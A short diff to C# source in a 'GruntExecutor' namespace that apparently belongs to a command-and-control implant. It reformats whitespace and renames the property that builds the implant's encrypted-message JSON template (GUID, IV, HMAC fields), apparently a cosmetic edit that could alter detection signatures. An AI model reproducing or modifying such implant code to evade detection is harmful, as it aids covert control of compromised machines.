@@ -998,7 +998,7 @@ namespace GruntExecutor
         Tasks,
         TaskKill
     }
-	
+
     public class GruntTaskingMessage
     {
         public GruntTaskingType Type { get; set; }
@@ -1090,20 +1090,22 @@ namespace GruntExecutor
                 return false;
             }
         }
-		private static string GruntEncryptedMessageFormat
+
+        
+      	private static string GruntEncryptedMessageFormatCombo
 		{
-		    get
-		    {
-		        var sb = new StringBuilder(@"{{""GUID"":""{0}"",");
-		        sb.Append(@"""Type"":{1},");
-		        sb.Append(@"""Meta"":""{2}"",");
-		        sb.Append(@"""IV"":""{3}"",");
+    		get
+    		{
+	        	var sb = new StringBuilder(@"{{""GUID"":""{0}"",");
+	        	sb.Append(@"""Type"":{1},");
+	        	sb.Append(@"""Meta"":""{2}"",");
+	        	sb.Append(@"""IV"":""{3}"",");
 	        	sb.Append(@"""EncryptedMessage"":""{4}"",");
 	        	sb.Append(@"""HMAC"":""{5}""}}");
 	        	return sb.ToString();
 	    	}
 		}
-        private static string GruntEncryptedMessageFormat = GruntEncryptedMessageFormat;
+      	private static string GruntEncryptedMessageFormat = GruntEncryptedMessageFormatCombo;
         public static GruntEncryptedMessage FromJson(string message)
         {
 			List<string> parseList = Utilities.Parse(message, GruntEncryptedMessageFormat);
